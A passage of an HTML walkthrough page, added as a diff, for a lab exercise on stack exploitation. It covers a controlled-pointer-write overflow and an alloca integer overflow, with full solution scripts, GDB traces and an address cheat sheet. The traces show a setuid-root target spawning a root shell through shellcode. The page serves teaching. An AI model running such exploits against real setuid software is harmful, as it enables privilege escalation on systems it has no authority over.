+<span class="g">EAX = p = 0xfff6ba4c</span>
+<span class="g">EDX = a = 0xfff6b238</span>
+0xfff6ba4c: 0x0804a0c0 0xfffeb240 0x00000000 0x00000000
+
+<span class="b">[4] target3: AFTER '*p = a'</span>
+<span class="r">saved EIP slot 0xfff6ba4c now contains 0xfff6b238</span>
+
+<span class="b">[5] target3: vulnerable() ret</span>
+ESP = 0xfff6ba4c
+<span class="g">ret will pop = 0xfff6b238</span>
+first instruction at target:
+   0xfff6b238: xor ebx,ebx
+process ... is executing new program: /usr/bin/dash</pre>
+
+    <h3>sol3.py, line by line</h3>
+    <div class="file-label">sol3.py</div>
+    <pre>from shellcode import shellcode
+import sys
+
+payload = shellcode
+
+padding_length = 2048 - len(shellcode)  <span class="c"># fill buf[0..2047]</span>
+payload += b"A" * padding_length
+
+a = (0xfff6b238).to_bytes(4, "little")  <span class="c"># value written by *p = a</span>
+payload += a
+
+p = (0xfff6ba4c).to_bytes(4, "little")  <span class="c"># address written to</span>
+payload += p
+
+sys.stdout.buffer.write(payload)</pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>Why it is correct</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">payload = shellcode</td><td>Shellcode starts at <code>BUF=0xfff6b238</code>.</td></tr>
+          <tr><td class="mono">padding_length = 2048 - len(shellcode)</td><td>Fills the entire declared 2048-byte array.</td></tr>
+          <tr><td class="mono">a = 0xfff6b238</td><td>The value that will be written. It is the shellcode's address.</td></tr>
+          <tr><td class="mono">p = 0xfff6ba4c</td><td>The destination. It is the saved-EIP slot of <code>vulnerable()</code>.</td></tr>
+          <tr><td class="mono">write(payload)</td><td>Copied by <code>strncpy</code>; the last 8 bytes land on <code>a</code> and <code>p</code>.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout success">
+      <strong>Why the order is a then p</strong>
+      The stack layout is <code>buf[2048]</code>, then <code>a</code> at
+      <code>EBP-0x10</code>, then <code>p</code> at <code>EBP-0xc</code>. Copying past the
+      buffer writes the first 4 extra bytes into <code>a</code> and the next 4 into
+      <code>p</code>. After that, the program executes <code>mov eax,[EBP-0xc]</code>
+      (load p), <code>mov edx,[EBP-0x10]</code> (load a), and
+      <code>mov [eax],edx</code> (write a to *p). The saved EIP becomes the shellcode
+      address, and <code>ret</code> jumps to it.
+    </div>
+
+    <div class="callout warn">
+      <strong>This is not a normal return-address overflow</strong>
+      The payload does not directly overwrite <code>EBP+4</code>. It abuses the programming
+      bug <code>*p = a</code>, where both <code>p</code> and <code>a</code> are
+      uninitialized locals that the overflow controls. That is why the exploit works even
+      though <code>strncpy</code> stops 8 bytes past the buffer.
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target3.txt">gdb_target3.txt</a> ·
+      disassembly: <a href="target3_disasm.txt">target3_disasm.txt</a> ·
+      source: <a href="target3.c">target3.c</a> · solution: <a href="sol3.py">sol3.py</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="target4">
+    <div class="target-head">
+      <h2><span class="num">5</span>Target 4 — alloca integer overflow</h2>
+      <span class="tag">file input · alloca · read_elements · setuid root</span>
+    </div>
+    <p class="section-intro">
+      Target 4 does not read a command-line string. It reads a binary file: the first
+      4 bytes are a count, followed by 32-bit integers. The count is used for an
+      <code>alloca(count * 4)</code>, but <code>0x40000000 * 4</code> wraps to zero in
+      32-bit arithmetic. The allocation becomes zero bytes, while <code>read_elements</code>
+      still believes the count is huge and keeps reading words into the stack.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target4.c</h3>
+        <pre style="margin-bottom:0">void read_elements(FILE *f, int *buf, unsigned int count)
+{
+    unsigned int i;
+    for (i=0; i &lt; count; i++) {
+        if (fread(&amp;buf[i], sizeof(unsigned int), 1, f) &lt; 1)
+            break;
+    }
+}
+
+void read_file(char *name)
+{
+    FILE *f = fopen(name, "rb");
+    unsigned int count;
+    fread(&amp;count, sizeof(unsigned int), 1, f);
+
+    unsigned int *buf = alloca(count * sizeof(unsigned int));
+
+    read_elements(f, buf, count);   <span class="c">// still uses the huge count</span>
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly — the size wraps to zero</h3>
+        <pre style="margin-bottom:0">804a149: mov eax,[ebp-0x14]   <span class="c">; count</span>
+<span class="y">804a14c: shl eax,2</span>           <span class="c">; count * 4 (32-bit)</span>
+804a14f: lea edx,[eax+0xc]
+...
+804a166: div ecx
+804a168: imul eax,eax,0x10
+<span class="g">804a16b: sub esp,eax</span>          <span class="c">; alloca(size)</span>
+804a16d: mov eax,esp
+...
+804a181: push count
+804a188: push buf
+804a18b: push f
+804a18e: call read_elements</pre>
+        <p class="small" style="margin-bottom:0">
+          With <code>count = 0x40000000</code>, <code>shl eax,2</code> produces
+          <code>0x00000000</code>. The stack is not moved, so <code>buf</code> points at
+          the current stack position. The later loop still uses the original huge count.
+        </p>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>The file format</strong>
+      First 4 bytes: <code>count = 0x40000000</code> (little-endian
+      <code>00 00 00 40</code>). Then the file contains 160 4-byte words. The first 11
+      words are NOPs, word 11 is the return address, and the remaining words are a NOP sled
+      followed by shellcode. The file is generated by <code>sol4.py</code>, not passed as
+      an argument.
+    </div>
+
+    <h3>GDB evidence — zero-size buffer and the overwritten return address</h3>
+    <div class="file-label">gdb_target4.txt</div>
+    <pre><span class="b">[1] target4: read_file() before read_elements()</span>
+read_file EBP = 0xfff6ba48
+<span class="y">count = [EBP-0x14] = 0x40000000</span>
+<span class="y">buf   = [EBP-0x10] = 0xfff6ba20</span>
+saved EIP slot = EBP+4 = 0xfff6ba4c (original 0x0804a1eb)
+<span class="g">GDB: count * 4 overflows to 0x00000000, so alloca is effectively 0</span>
+
+<span class="b">[2] target4: AFTER read_elements() returns</span>
+buf = 0xfff6ba20   count = 0x90909090
+buffer words (index 0..15):
+0xfff6ba20: 0x90909090 0x90909090 0x90909090 0x90909090
+0xfff6ba30: 0x90909090 0x90909090 0x90909090 0x90909090
+0xfff6ba40: 0x90909090 0x90909090 0x90909090 <span class="g">0xfff6bb5c</span>
+0xfff6ba50: 0x90909090 0x90909090 0x90909090 0x90909090
+<span class="g">word 11 (offset 44) at 0xfff6ba4c = 0xfff6bb5c</span>
+<span class="r">read_file saved EIP slot 0xfff6ba4c contains 0xfff6bb5c</span>
+
+<span class="b">[3] target4: read_file() ret</span>
+ESP = 0xfff6ba4c
+<span class="g">ret will pop = 0xfff6bb5c</span>
+0xfff6ba4c: 0xfff6bb5c 0x90909090 0x90909090 0x90909090
+bytes at target address:
+0xfff6bb5c: 90 90 90 90 90 90 90 90
+instruction at target:
+   0xfff6bb5c: nop
+process ... is executing new program: /usr/bin/dash</pre>
+
+    <div class="callout info">
+      <strong>Why index 11?</strong>
+      The buffer pointer is <code>0xfff6ba20</code>. The saved EIP slot is
+      <code>0xfff6ba4c</code>. Their difference is <code>0x2c = 44</code> bytes, which is
+      exactly <code>11 * 4</code>. So the 12th 32-bit word, index 11, lands on the saved
+      return address. Words 0–10 are NOP filler, word 11 is the new return address, and
+      words 12 onward contain the NOP sled and shellcode.
+    </div>
+
+    <div class="callout warn">
+      <strong>Why the count variable in GDB shows 0x90909090 later</strong>
+      The local <code>count</code> lives at <code>EBP-0x14 = 0xfff6ba34</code>, which is
+      inside the overflowed region (buffer index 5). The payload overwrites it with NOPs.
+      But <code>read_elements</code> received its own <code>count</code> argument before
+      the overwrite, so its loop still uses <code>0x40000000</code> and keeps reading until
+      <code>fread</code> hits EOF. The overwritten copy in <code>read_file</code> is no
+      longer used after the call.
+    </div>
+
+    <h3>sol4.py, line by line</h3>
+    <div class="file-label">sol4.py</div>
+    <pre>import sys
+from shellcode import shellcode
+
+return_address = 11           <span class="c"># word index that lands on saved EIP</span>
+buff = 0xfff6ba20             <span class="c"># buffer start from GDB</span>
+
+overflow = 0x40000000         <span class="c"># count * 4 wraps to 0</span>
+
+sc = bytes(shellcode)
+while len(sc) % 4:
+    sc += b"\x90"
+sc_ints = [int.from_bytes(sc[i:i+4], "little")
+           for i in range(0, len(sc), 4)]
+
+total  = 160
+sled_n = total - (return_address + 1) - len(sc_ints)
+
+payload  = [0x90909090] * return_address
+payload += [0]
+payload += [0x90909090] * sled_n
+payload += sc_ints
+
+payload[return_address] = buff + 4 * (return_address + 1 + sled_n // 2)
+
+sys.stdout.buffer.write(overflow.to_bytes(4, "little"))
+for v in payload:
+    sys.stdout.buffer.write(v.to_bytes(4, "little"))</pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>What it does / why</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">return_address = 11</td><td>Index 11 of the word array is <code>0xfff6ba4c</code>, the saved EIP slot.</td></tr>
+          <tr><td class="mono">buff = 0xfff6ba20</td><td>GDB shows this is the zero-size buffer start.</td></tr>
+          <tr><td class="mono">overflow = 0x40000000</td><td>Written as the file's 4-byte count. Multiplying by 4 wraps to zero in 32-bit arithmetic.</td></tr>
+          <tr><td class="mono">while len(sc) % 4: sc += NOP</td><td>Pads shellcode to whole 4-byte words so it can be written as integers.</td></tr>
+          <tr><td class="mono">sc_ints = ...</td><td>Converts the shellcode into little-endian 32-bit words.</td></tr>
+          <tr><td class="mono">total = 160</td><td>Number of words written to the file. The loop stops at EOF, not at the huge count.</td></tr>
+          <tr><td class="mono">sled_n = ...</td><td>Space left for the NOP sled after the return-address word and the shellcode words.</td></tr>
+          <tr><td class="mono">payload = [NOP] * 11</td><td>Words 0–10 fill the stack below the return address with NOPs.</td></tr>
+          <tr><td class="mono">payload += [0]</td><td>Placeholder for word 11; replaced with the sled address below.</td></tr>
+          <tr><td class="mono">payload += [NOP] * sled_n</td><td>NOP sled after the overwritten return address.</td></tr>
+          <tr><td class="mono">payload += sc_ints</td><td>Shellcode placed after the sled.</td></tr>
+          <tr><td class="mono">payload[11] = ...</td><td>Sets the saved EIP to the middle of the NOP sled: <code>0xfff6bb5c</code>.</td></tr>
+          <tr><td class="mono">write(overflow)</td><td>First 4 bytes of the file: <code>00 00 00 40</code>.</td></tr>
+          <tr><td class="mono">for v in payload: write(v)</td><td>Appends 160 little-endian words: the stack overflow data.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout success">
+      <strong>Run it</strong>
+      <code>python3 sol4.py &gt; data4</code><br>
+      <code>./target4 data4</code><br>
+      Then type <code>id</code> inside the shell. Target4 is setuid-root, and the shellcode
+      calls <code>setuid(0)</code> before <code>execve("/bin/sh")</code>.
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target4.txt">gdb_target4.txt</a> ·
+      disassembly: <a href="target4_disasm.txt">target4_disasm.txt</a> ·
+      source: <a href="target4.c">target4.c</a> · solution: <a href="sol4.py">sol4.py</a>
+    </p>
+  </section>
+
+  <!-- ============================================================ -->
+  <section id="cheat">
+    <h2><span class="num">6</span>Address cheat sheet</h2>
+    <p class="section-intro">
+      These are the values that matter most when re-doing the targets or reading the GDB
+      logs. They are stable on this VM because the helper normalizes the stack and ASLR is
+      disabled globally.
+    </p>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>Target</th><th>Buffer / source</th><th>Saved EIP slot</th><th>Payload offset</th><th>Target value</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>target0</strong></td>
+            <td><code>name=0xfff6ba51</code><br><code>grade=0xfff6ba5b</code></td>
+            <td><code>0xfff6ba6c</code></td>
+            <td>10 bytes name → grade</td>
+            <td>grade becomes <code>"A+"</code></td>
+          </tr>
+          <tr>
+            <td><strong>target1</strong></td>
+            <td><code>input=0xfff6ba4c</code></td>
+            <td><code>0xfff6ba5c</code></td>
+            <td>16 bytes</td>
+            <td><code>0x0804a123</code> → <code>print_good_grade</code></td>
+          </tr>
+          <tr>
+            <td><strong>target2</strong></td>
+            <td><code>buf=0xfff6b9dc</code></td>
+            <td><code>0xfff6ba4c</code></td>
+            <td>112 bytes</td>
+            <td><code>0xfff6b9dc</code> → shellcode at buf</td>
+          </tr>
+          <tr>
+            <td><strong>target3</strong></td>
+            <td><code>buf=0xfff6b238</code><br><code>a=0xfff6ba38</code>, <code>p=0xfff6ba3c</code></td>
+            <td><code>0xfff6ba4c</code></td>
+            <td>2048 + 8 bytes</td>
+            <td><code>a=0xfff6b238</code>, <code>p=0xfff6ba4c</code></td>
+          </tr>
+          <tr>
+            <td><strong>target4</strong></td>
+            <td><code>buf=0xfff6ba20</code><br>count at buffer index 5</td>
+            <td><code>0xfff6ba4c</code></td>
+            <td>word index 11</td>
+            <td><code>0xfff6bb5c</code> → NOP sled</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout info">
+      <strong>General pattern across targets 2–4</strong>
+      Find the buffer address in GDB, calculate the distance to <code>[EBP+4]</code>, decide
+      whether you can overwrite it directly (target2), indirectly through a controlled write
+      (target3), or through a file-driven loop (target4), then point execution at shellcode
+      or an existing function. The stack is executable for all three, which is why injecting
+      shellcode works.
+    </div>
+  </section>
+
+  <footer>
+    <p>
+      Evidence files:
+      <a href="gdb_target0.txt">gdb_target0.txt</a> ·
+      <a href="gdb_target1.txt">gdb_target1.txt</a> ·
+      <a href="gdb_target2.txt">gdb_target2.txt</a> ·
+      <a href="gdb_target3.txt">gdb_target3.txt</a> ·
+      <a href="gdb_target4.txt">gdb_target4.txt</a>.
+    </p>
+    <p>
+      Disassembly:
+      <a href="target0_disasm.txt">target0</a> ·
+      <a href="target1_disasm.txt">target1</a> ·
+      <a href="target2_disasm.txt">target2</a> ·
+      <a href="target3_disasm.txt">target3</a> ·
+      <a href="target4_disasm.txt">target4</a>.
+      Sources and solutions are linked at the end of each section.
+    </p>
+    <p>Targets 0–4 walkthrough · educational use only. Targets 5 and 6 have separate pages.</p>
+  </footer>
+</main>
+</body>
+</html>
